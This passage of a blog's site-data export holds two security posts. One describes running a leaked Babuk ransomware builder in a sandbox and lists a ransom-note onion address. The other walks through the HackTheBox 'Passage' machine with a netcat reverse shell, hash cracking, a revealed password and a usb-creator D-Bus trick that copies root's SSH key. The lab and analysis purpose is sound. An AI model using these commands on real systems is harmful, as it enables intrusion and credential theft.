ransomware with their builder\n    Features of the generated malware\n    Uploading samples to virustotal and any.run  \n\n-----------------------------------------------------------------------------------------------------------------------\n\n**DISCLAIMER** \n\nI am not an experienced reverse engineer or malware analyst. If you are looking for high quality, polished, tutorialesque content this is not the article for you. I am not responsible for any damage you cause to your own systems or others. At the end I will include high quality resources.\n\n**END DISCLAIMER**\n\n -----------------------------------------------------------------------------------------------------------------------\n\n \n## Setup\n I started out by downloading our sample from: https://vxug.fakedoma.in/tmp\n\nWhich is my favorite malware repository and archive among other things, to a sand boxed Windows 7 installation with tools installed. \n\nAir gapping the VM by removing networking functionality, drag and drop/copy paste, and shared folder access to name a few measures taken. \n\nIf you would like a more polished experience check out: https://github.com/mandiant/flare-vm  \"a fully customizable, Windows-based security distribution for malware analysis, incident response, penetration testing, etc.\" to use the authors own words. \n\n\n## GENERATING RANSOMWARE!!\n\nTaking a quick glance at the source code using visual studio code (what the group clearly used to write this) \n\n![](/assets/images/babukPost/ransom2.png)\n\nWe can get an idea of the syntax of this builder.exe that continually draws my eye. \n\n![](/assets/images/babukPost/ransom3.png)\n\nHere we see that it's as simple as executing that previously mentioned exe file and the name of the folder you want to output to. \n\n(Upon deeper inspection there is functionality to \"...pass as a second argument an actual elliptic curve encryption key, instead of letting the builder generate it for us, allowing the ransomware operator to use the same decryption executable for different builds. Furthermore, it has been observed that, if no encryption key is specified as an argument, the key would be generated randomly.\"\nas written in: https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\n\n## FEATURES OF THE GENERATED MALWARE\n\n![](/assets/images/babukPost/ransom4.png)\n\nThe files follow a very simple naming convention. The prefix \"d\" is used to indicated that the file is used to decrypt the specified architecture (the second \"syllable\") \n\nIn the following files the prefix e indicates the file is used to encrypt instead. \n\nThe \"CURVE25519\" files are the aforementioned randomly generated eliptic curve encryption keys.\n\nToday I am going to run the e_win executable and check out the results. The exsi, linux, arm and x86 files could very have profound differences. (I doubt it) \n\n![](/assets/images/babukPost/ransom-note.jpg)\n\n## ANY.RUN analysis and IOCs (Indicators of compromise)\nIn the note dropped by an unedited note file build of babuk ransomware there is a link to this onion address:  \ntsu2dpiiv4zjzfyq73eibemit2qyrimbbb6lhpm6n5ihgallom5lhdyd.onion (click at your own risk)\n\n![](/assets/images/babukPost/ransom5.png)\n\n## Sources:\n\nhttps://blog.talosintelligence.com/2021/11/babuk-exploits-exchange.html\n\nhttps://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\n\nhttps://blog.malwarebytes.com/reports/2021/06/babuk-ransomware-builder-leaked-following-muddled-retirement/\n\n\n","source":"_posts/2021-12-9-Leaked Babuk Ransomware Builder Fun.md","raw":"---\nlayout: single\ntitle: Leaked Babuk Ransomware Builder Fun!! \ndate: 2021-12-9\nclasses: wide\nheader:\n  teaser: /assets/images/ransom-note.jpg\ntags:\n  - Ransomware\n  - Malware analysis\n--- \n\nRealized I had a file named \"babuk_builder.zip\" sitting on my computer that I haven't messed with. \nToday's the day! This isn't the cutting edge of ransomware leaks but it is interesting none the less.\n![](/assets/images/babukPost/ransom-built.png)\n\n## Objectives\nIn this post I will go over:\n\n    The process of generating ransomware with their builder\n    Features of the generated malware\n    Uploading samples to virustotal and any.run  \n\n-----------------------------------------------------------------------------------------------------------------------\n\n**DISCLAIMER** \n\nI am not an experienced reverse engineer or malware analyst. If you are looking for high quality, polished, tutorialesque content this is not the article for you. I am not responsible for any damage you cause to your own systems or others. At the end I will include high quality resources.\n\n**END DISCLAIMER**\n\n -----------------------------------------------------------------------------------------------------------------------\n\n \n## Setup\n I started out by downloading our sample from: https://vxug.fakedoma.in/tmp\n\nWhich is my favorite malware repository and archive among other things, to a sand boxed Windows 7 installation with tools installed. \n\nAir gapping the VM by removing networking functionality, drag and drop/copy paste, and shared folder access to name a few measures taken. \n\nIf you would like a more polished experience check out: https://github.com/mandiant/flare-vm  \"a fully customizable, Windows-based security distribution for malware analysis, incident response, penetration testing, etc.\" to use the authors own words. \n\n\n## GENERATING RANSOMWARE!!\n\nTaking a quick glance at the source code using visual studio code (what the group clearly used to write this) \n\n![](/assets/images/babukPost/ransom2.png)\n\nWe can get an idea of the syntax of this builder.exe that continually draws my eye. \n\n![](/assets/images/babukPost/ransom3.png)\n\nHere we see that it's as simple as executing that previously mentioned exe file and the name of the folder you want to output to. \n\n(Upon deeper inspection there is functionality to \"...pass as a second argument an actual elliptic curve encryption key, instead of letting the builder generate it for us, allowing the ransomware operator to use the same decryption executable for different builds. Furthermore, it has been observed that, if no encryption key is specified as an argument, the key would be generated randomly.\"\nas written in: https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\n\n## FEATURES OF THE GENERATED MALWARE\n\n![](/assets/images/babukPost/ransom4.png)\n\nThe files follow a very simple naming convention. The prefix \"d\" is used to indicated that the file is used to decrypt the specified architecture (the second \"syllable\") \n\nIn the following files the prefix e indicates the file is used to encrypt instead. \n\nThe \"CURVE25519\" files are the aforementioned randomly generated eliptic curve encryption keys.\n\nToday I am going to run the e_win executable and check out the results. The exsi, linux, arm and x86 files could very have profound differences. (I doubt it) \n\n![](/assets/images/babukPost/ransom-note.jpg)\n\n## ANY.RUN analysis and IOCs (Indicators of compromise)\nIn the note dropped by an unedited note file build of babuk ransomware there is a link to this onion address:  \ntsu2dpiiv4zjzfyq73eibemit2qyrimbbb6lhpm6n5ihgallom5lhdyd.onion (click at your own risk)\n\n![](/assets/images/babukPost/ransom5.png)\n\n## Sources:\n\nhttps://blog.talosintelligence.com/2021/11/babuk-exploits-exchange.html\n\nhttps://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\n\nhttps://blog.malwarebytes.com/reports/2021/06/babuk-ransomware-builder-leaked-following-muddled-retirement/\n\n\n","slug":"2021-12-9-Leaked Babuk Ransomware Builder Fun","published":1,"updated":"2024-07-24T16:20:44.838Z","comments":1,"photos":[],"_id":"clz07c5kz000fm3cp9y19ck0f","content":"<p>Realized I had a file named “babuk_builder.zip” sitting on my computer that I haven’t messed with.<br>Today’s the day! This isn’t the cutting edge of ransomware leaks but it is interesting none the less.<br><img src=\"/assets/images/babukPost/ransom-built.png\"></p>\n<h2 id=\"Objectives\"><a href=\"#Objectives\" class=\"headerlink\" title=\"Objectives\"></a>Objectives</h2><p>In this post I will go over:</p>\n<pre><code>The process of generating ransomware with their builder\nFeatures of the generated malware\nUploading samples to virustotal and any.run  \n</code></pre>\n<hr>\n<p><strong>DISCLAIMER</strong> </p>\n<p>I am not an experienced reverse engineer or malware analyst. If you are looking for high quality, polished, tutorialesque content this is not the article for you. I am not responsible for any damage you cause to your own systems or others. At the end I will include high quality resources.</p>\n<p><strong>END DISCLAIMER</strong></p>\n<hr>\n<h2 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h2><p> I started out by downloading our sample from: <a href=\"https://vxug.fakedoma.in/tmp\">https://vxug.fakedoma.in/tmp</a></p>\n<p>Which is my favorite malware repository and archive among other things, to a sand boxed Windows 7 installation with tools installed. </p>\n<p>Air gapping the VM by removing networking functionality, drag and drop&#x2F;copy paste, and shared folder access to name a few measures taken. </p>\n<p>If you would like a more polished experience check out: <a href=\"https://github.com/mandiant/flare-vm\">https://github.com/mandiant/flare-vm</a>  “a fully customizable, Windows-based security distribution for malware analysis, incident response, penetration testing, etc.” to use the authors own words. </p>\n<h2 id=\"GENERATING-RANSOMWARE\"><a href=\"#GENERATING-RANSOMWARE\" class=\"headerlink\" title=\"GENERATING RANSOMWARE!!\"></a>GENERATING RANSOMWARE!!</h2><p>Taking a quick glance at the source code using visual studio code (what the group clearly used to write this) </p>\n<p><img src=\"/assets/images/babukPost/ransom2.png\"></p>\n<p>We can get an idea of the syntax of this builder.exe that continually draws my eye. </p>\n<p><img src=\"/assets/images/babukPost/ransom3.png\"></p>\n<p>Here we see that it’s as simple as executing that previously mentioned exe file and the name of the folder you want to output to. </p>\n<p>(Upon deeper inspection there is functionality to “…pass as a second argument an actual elliptic curve encryption key, instead of letting the builder generate it for us, allowing the ransomware operator to use the same decryption executable for different builds. Furthermore, it has been observed that, if no encryption key is specified as an argument, the key would be generated randomly.”<br>as written in: <a href=\"https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\">https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/</a></p>\n<h2 id=\"FEATURES-OF-THE-GENERATED-MALWARE\"><a href=\"#FEATURES-OF-THE-GENERATED-MALWARE\" class=\"headerlink\" title=\"FEATURES OF THE GENERATED MALWARE\"></a>FEATURES OF THE GENERATED MALWARE</h2><p><img src=\"/assets/images/babukPost/ransom4.png\"></p>\n<p>The files follow a very simple naming convention. The prefix “d” is used to indicated that the file is used to decrypt the specified architecture (the second “syllable”) </p>\n<p>In the following files the prefix e indicates the file is used to encrypt instead. </p>\n<p>The “CURVE25519” files are the aforementioned randomly generated eliptic curve encryption keys.</p>\n<p>Today I am going to run the e_win executable and check out the results. The exsi, linux, arm and x86 files could very have profound differences. (I doubt it) </p>\n<p><img src=\"/assets/images/babukPost/ransom-note.jpg\"></p>\n<h2 id=\"ANY-RUN-analysis-and-IOCs-Indicators-of-compromise\"><a href=\"#ANY-RUN-analysis-and-IOCs-Indicators-of-compromise\" class=\"headerlink\" title=\"ANY.RUN analysis and IOCs (Indicators of compromise)\"></a>ANY.RUN analysis and IOCs (Indicators of compromise)</h2><p>In the note dropped by an unedited note file build of babuk ransomware there is a link to this onion address:<br>tsu2dpiiv4zjzfyq73eibemit2qyrimbbb6lhpm6n5ihgallom5lhdyd.onion (click at your own risk)</p>\n<p><img src=\"/assets/images/babukPost/ransom5.png\"></p>\n<h2 id=\"Sources\"><a href=\"#Sources\" class=\"headerlink\" title=\"Sources:\"></a>Sources:</h2><p><a href=\"https://blog.talosintelligence.com/2021/11/babuk-exploits-exchange.html\">https://blog.talosintelligence.com/2021/11/babuk-exploits-exchange.html</a></p>\n<p><a href=\"https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\">https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/</a></p>\n<p><a href=\"https://blog.malwarebytes.com/reports/2021/06/babuk-ransomware-builder-leaked-following-muddled-retirement/\">https://blog.malwarebytes.com/reports/2021/06/babuk-ransomware-builder-leaked-following-muddled-retirement/</a></p>\n","excerpt":"","more":"<p>Realized I had a file named “babuk_builder.zip” sitting on my computer that I haven’t messed with.<br>Today’s the day! This isn’t the cutting edge of ransomware leaks but it is interesting none the less.<br><img src=\"/assets/images/babukPost/ransom-built.png\"></p>\n<h2 id=\"Objectives\"><a href=\"#Objectives\" class=\"headerlink\" title=\"Objectives\"></a>Objectives</h2><p>In this post I will go over:</p>\n<pre><code>The process of generating ransomware with their builder\nFeatures of the generated malware\nUploading samples to virustotal and any.run  \n</code></pre>\n<hr>\n<p><strong>DISCLAIMER</strong> </p>\n<p>I am not an experienced reverse engineer or malware analyst. If you are looking for high quality, polished, tutorialesque content this is not the article for you. I am not responsible for any damage you cause to your own systems or others. At the end I will include high quality resources.</p>\n<p><strong>END DISCLAIMER</strong></p>\n<hr>\n<h2 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h2><p> I started out by downloading our sample from: <a href=\"https://vxug.fakedoma.in/tmp\">https://vxug.fakedoma.in/tmp</a></p>\n<p>Which is my favorite malware repository and archive among other things, to a sand boxed Windows 7 installation with tools installed. </p>\n<p>Air gapping the VM by removing networking functionality, drag and drop&#x2F;copy paste, and shared folder access to name a few measures taken. </p>\n<p>If you would like a more polished experience check out: <a href=\"https://github.com/mandiant/flare-vm\">https://github.com/mandiant/flare-vm</a>  “a fully customizable, Windows-based security distribution for malware analysis, incident response, penetration testing, etc.” to use the authors own words. </p>\n<h2 id=\"GENERATING-RANSOMWARE\"><a href=\"#GENERATING-RANSOMWARE\" class=\"headerlink\" title=\"GENERATING RANSOMWARE!!\"></a>GENERATING RANSOMWARE!!</h2><p>Taking a quick glance at the source code using visual studio code (what the group clearly used to write this) </p>\n<p><img src=\"/assets/images/babukPost/ransom2.png\"></p>\n<p>We can get an idea of the syntax of this builder.exe that continually draws my eye. </p>\n<p><img src=\"/assets/images/babukPost/ransom3.png\"></p>\n<p>Here we see that it’s as simple as executing that previously mentioned exe file and the name of the folder you want to output to. </p>\n<p>(Upon deeper inspection there is functionality to “…pass as a second argument an actual elliptic curve encryption key, instead of letting the builder generate it for us, allowing the ransomware operator to use the same decryption executable for different builds. Furthermore, it has been observed that, if no encryption key is specified as an argument, the key would be generated randomly.”<br>as written in: <a href=\"https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\">https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/</a></p>\n<h2 id=\"FEATURES-OF-THE-GENERATED-MALWARE\"><a href=\"#FEATURES-OF-THE-GENERATED-MALWARE\" class=\"headerlink\" title=\"FEATURES OF THE GENERATED MALWARE\"></a>FEATURES OF THE GENERATED MALWARE</h2><p><img src=\"/assets/images/babukPost/ransom4.png\"></p>\n<p>The files follow a very simple naming convention. The prefix “d” is used to indicated that the file is used to decrypt the specified architecture (the second “syllable”) </p>\n<p>In the following files the prefix e indicates the file is used to encrypt instead. </p>\n<p>The “CURVE25519” files are the aforementioned randomly generated eliptic curve encryption keys.</p>\n<p>Today I am going to run the e_win executable and check out the results. The exsi, linux, arm and x86 files could very have profound differences. (I doubt it) </p>\n<p><img src=\"/assets/images/babukPost/ransom-note.jpg\"></p>\n<h2 id=\"ANY-RUN-analysis-and-IOCs-Indicators-of-compromise\"><a href=\"#ANY-RUN-analysis-and-IOCs-Indicators-of-compromise\" class=\"headerlink\" title=\"ANY.RUN analysis and IOCs (Indicators of compromise)\"></a>ANY.RUN analysis and IOCs (Indicators of compromise)</h2><p>In the note dropped by an unedited note file build of babuk ransomware there is a link to this onion address:<br>tsu2dpiiv4zjzfyq73eibemit2qyrimbbb6lhpm6n5ihgallom5lhdyd.onion (click at your own risk)</p>\n<p><img src=\"/assets/images/babukPost/ransom5.png\"></p>\n<h2 id=\"Sources\"><a href=\"#Sources\" class=\"headerlink\" title=\"Sources:\"></a>Sources:</h2><p><a href=\"https://blog.talosintelligence.com/2021/11/babuk-exploits-exchange.html\">https://blog.talosintelligence.com/2021/11/babuk-exploits-exchange.html</a></p>\n<p><a href=\"https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/\">https://lab52.io/blog/quick-review-of-babuk-ransomware-builder/</a></p>\n<p><a href=\"https://blog.malwarebytes.com/reports/2021/06/babuk-ransomware-builder-leaked-following-muddled-retirement/\">https://blog.malwarebytes.com/reports/2021/06/babuk-ransomware-builder-leaked-following-muddled-retirement/</a></p>\n"},{"layout":"single","title":"Passage HackTheBox Walkthrough","date":"2022-07-25T04:00:00.000Z","classes":"wide","header":{"teaser":null},"_content":" \n\nThis box was made by my buddy @ChefByzen on Twitter, I know him from our Uni CTF team. Very cool box!\n\nLet's get into it.\nI started off by enumerating like usual with NMAP\n```\n# Nmap 7.80 scan initiated Sat Sep 26 16:38:13 2020 as: nmap -sCV -p- -vvv -A -T4 -oA passage 10.10.10.206\nNmap scan report for 10.10.10.206\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F\n|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=\n|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd\n80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Passage News\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n```\n\nNot much is open so I decided to check out the site\nImmediately I see that they have fail2ban and another user kim switft\n\n```\n**Implemented Fail2Ban**\n18 Jun 2020 By admin 0 Comments\nDue to unusally large amounts of traffic, View & Comment\nPhasellus tristique urna\n12 Jun 2020 By Kim Swift 0 Comments\nSed felis pharetra, nec sodales diam sagittis. View & Comment \n```\n\nSo gobuster is out of the question to enumerate directories.\nI set out to investigate the site manually by playing around and I saw that it is powered by cutenews\nAfter searching around I came across two exploits for it. \nOne was metasploit and the other someone had written a python script for after the box was released.\nThe author of the box says that the intended route is with metasploit.\n\nIn either case you get a shell as www-data, we can't get the flag just yet. We have to escalate privileges to get the user flag. \n\n![](/assets/images/PassageHTB/cutenews.png)\n\nFirst order of business was making this a reverse shell cause I can't stand that default shell.\nI ran nc -lnvp 9827 on my host kali machine and nc 10.10.**.** 9827 -e /bin/bash on the passage box\n\n--------------------------\n\nPRO TIP: RUN THESE FOR AN ENJOYABLE EXPERIENCE IN YOUR SHELL\n```\npython -c 'import pty;pty.spawn(\"/bin/bash\");'\n```\nthen\n```\n[CTRL-Z]\nstty raw -echo;fg\n[ENTER][ENTER]\n\nsource /etc/skel/.bashrc \nexport TERM=screen-256color\n```\nEND OF PRO TIP \n\n--------------------\n\nAt this point I got lost, that was until until I dig deeper and found /var/www/html/CuteNews/cdata.\nIn this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files\n![](/assets/images/PassageHTB/base64.png)\n\nFor example, inside of one of those php files \n![](/assets/images/PassageHTB/1stphp.png)\nhas the first line as garbage and the second line being a base64 string. \nThis script turned out to be for naught as the actual way to escalate privileges can be found inside the **Lines** file. \n![](/assets/images/PassageHTB/lines.png)\nif you go through and decode them you come across one that says paul@passage.htb which is one of the two users I found when I was enumerating the home directory\n![](/assets/images/PassageHTB/homedir.png)\n\nThen we throw that hash we found into a hash analyzer and realize it's sha-256, well we could give it a shot cracking that hash to get his password.\n![](/assets/images/PassageHTB/analyzer.png)\n\nWe could easily enough crack it with hashcat but this online service did it in less than a second.\n![](/assets/images/PassageHTB/hashcrack.png)\nIf you want to take a more manual approach with hashcat yourself you could do it with \n```\nhashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt\n```\nat any rate you get atlanta1 as the password for paul\nI enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,\nI saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav. \n![](/assets/images/PassageHTB/sshNadav.png)\n\nNow out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.\nI always start out running a script that gives me a quick overview of the entire box very easily in case there's something i can spot out of place. In this case it didn't help all too much and I was left to exploring on my own\n\nfail2ban, zeitgeist, and CUPS were the first processes that I investigated but I didn't come to any solution. I finally stumbled upon\n\n```\n/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper\n```\nWhile looking at all the running processes. \nI don't remember having seen this before so I googled it and came across this article \nhttps://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/\nThey describe how to exploit this to copy files to other \n```\ngdbus call --system --dest com.ubuntu.USBCREATOR --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true\n```\nThis copies the root rsa key to /tmp/pwn on my box. \nthen we \n```\nchmod 600 root_id_rsa \nssh -i root_id_rsa root@10.10.10.206\n```\nAnd you can access root.txt\nThanks for reading!\n\n","source":"_posts/2022-7-25-Passage_HackTheBox.md","raw":"---\nlayout: single\ntitle:  Passage HackTheBox Walkthrough\ndate: 2022-7-25\nclasses: wide\nheader:\n  teaser: \ntags:\n  - HackTheBox\n  - ctf\n  - Linux\n--- \n\nThis box was made by my buddy @ChefByzen on Twitter, I know him from our Uni CTF team. Very cool box!\n\nLet's get into it.\nI started off by enumerating like usual with NMAP\n```\n# Nmap 7.80 scan initiated Sat Sep 26 16:38:13 2020 as: nmap -sCV -p- -vvv -A -T4 -oA passage 10.10.10.206\nNmap scan report for 10.10.10.206\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F\n|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=\n|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd\n80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Passage News\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n```\n\nNot much is open so I decided to check out the site\nImmediately I see that they have fail2ban and another user kim switft\n\n```\n**Implemented Fail2Ban**\n18 Jun 2020 By admin 0 Comments\nDue to unusally large amounts of traffic, View & Comment\nPhasellus tristique urna\n12 Jun 2020 By Kim Swift 0 Comments\nSed felis pharetra, nec sodales diam sagittis. View & Comment \n```\n\nSo gobuster is out of the question to enumerate directories.\nI set out to investigate the site manually by playing around and I saw that it is powered by cutenews\nAfter searching around I came across two exploits for it. \nOne was metasploit and the other someone had written a python script for after the box was released.\nThe author of the box says that the intended route is with metasploit.\n\nIn either case you get a shell as www-data, we can't get the flag just yet. We have to escalate privileges to get the user flag. \n\n![](/assets/images/PassageHTB/cutenews.png)\n\nFirst order of business was making this a reverse shell cause I can't stand that default shell.\nI ran nc -lnvp 9827 on my host kali machine and nc 10.10.**.** 9827 -e /bin/bash on the passage box\n\n--------------------------\n\nPRO TIP: RUN THESE FOR AN ENJOYABLE EXPERIENCE IN YOUR SHELL\n```\npython -c 'import pty;pty.spawn(\"/bin/bash\");'\n```\nthen\n```\n[CTRL-Z]\nstty raw -echo;fg\n[ENTER][ENTER]\n\nsource /etc/skel/.bashrc \nexport TERM=screen-256color\n```\nEND OF PRO TIP \n\n--------------------\n\nAt this point I got lost, that was until until I dig deeper and found /var/www/html/CuteNews/cdata.\nIn this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files\n![](/assets/images/PassageHTB/base64.png)\n\nFor example, inside of one of those php files \n![](/assets/images/PassageHTB/1stphp.png)\nhas the first line as garbage and the second line being a base64 string. \nThis script turned out to be for naught as the actual way to escalate privileges can be found inside the **Lines** file. \n![](/assets/images/PassageHTB/lines.png)\nif you go through and decode them you come across one that says paul@passage.htb which is one of the two users I found when I was enumerating the home directory\n![](/assets/images/PassageHTB/homedir.png)\n\nThen we throw that hash we found into a hash analyzer and realize it's sha-256, well we could give it a shot cracking that hash to get his password.\n![](/assets/images/PassageHTB/analyzer.png)\n\nWe could easily enough crack it with hashcat but this online service did it in less than a second.\n![](/assets/images/PassageHTB/hashcrack.png)\nIf you want to take a more manual approach with hashcat yourself you could do it with \n```\nhashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt\n```\nat any rate you get atlanta1 as the password for paul\nI enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,\nI saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav. \n![](/assets/images/PassageHTB/sshNadav.png)\n\nNow out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.\nI always start out running a script that gives me a quick overview of the entire box very easily in case there's something i can spot out of place. In this case it didn't help all too much and I was left to exploring on my own\n\nfail2ban, zeitgeist, and CUPS were the first processes that I investigated but I didn't come to any solution. I finally stumbled upon\n\n```\n/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper\n```\nWhile looking at all the running processes. \nI don't remember having seen this before so I googled it and came across this article \nhttps://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/\nThey describe how to exploit this to copy files to other \n```\ngdbus call --system --dest com.ubuntu.USBCREATOR --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true\n```\nThis copies the root rsa key to /tmp/pwn on my box. \nthen we \n```\nchmod 600 root_id_rsa \nssh -i root_id_rsa root@10.10.10.206\n```\nAnd you can access root.txt\nThanks for reading!\n\n","slug":"2022-7-25-Passage_HackTheBox","published":1,"updated":"2024-07-24T16:20:44.842Z","comments":1,"photos":[],"_id":"clz07c5l2000gm3cphx0u1dpn","content":"<p>This box was made by my buddy @ChefByzen on Twitter, I know him from our Uni CTF team. Very cool box!</p>\n<p>Let’s get into it.<br>I started off by enumerating like usual with NMAP</p>\n<pre><code class=\"hljs plaintext\"># Nmap 7.80 scan initiated Sat Sep 26 16:38:13 2020 as: nmap -sCV -p- -vvv -A -T4 -oA passage 10.10.10.206\nNmap scan report for 10.10.10.206\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F\n|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=\n|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd\n80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Passage News\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n\n<p>Not much is open so I decided to check out the site<br>Immediately I see that they have fail2ban and another user kim switft</p>\n<pre><code class=\"hljs plaintext\">**Implemented Fail2Ban**\n18 Jun 2020 By admin 0 Comments\nDue to unusally large amounts of traffic, View &amp; Comment\nPhasellus tristique urna\n12 Jun 2020 By Kim Swift 0 Comments\nSed felis pharetra, nec sodales diam sagittis. View &amp; Comment</code></pre>\n\n<p>So gobuster is out of the question to enumerate directories.<br>I set out to investigate the site manually by playing around and I saw that it is powered by cutenews<br>After searching around I came across two exploits for it.<br>One was metasploit and the other someone had written a python script for after the box was released.<br>The author of the box says that the intended route is with metasploit.</p>\n<p>In either case you get a shell as www-data, we can’t get the flag just yet. We have to escalate privileges to get the user flag. </p>\n<p><img 